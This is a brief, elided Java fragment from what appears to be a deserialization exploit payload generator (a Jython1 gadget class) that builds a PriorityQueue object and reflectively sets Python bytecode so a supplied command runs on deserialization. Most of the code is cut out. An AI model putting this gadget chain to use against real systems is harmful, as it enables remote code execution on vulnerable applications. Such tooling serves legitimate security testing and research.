...
public class Jython1 extends dogeser.payloads.util.PayloadRunner implements ObjectPayload<PriorityQueue> {
    ...
    public PriorityQueue getObject(String command) throws Exception {
        ...
        dogeser.payloads.util.Reflections.setFieldValue(codeobj, "co_code", new BigInteger(code, 16).toByteArray());
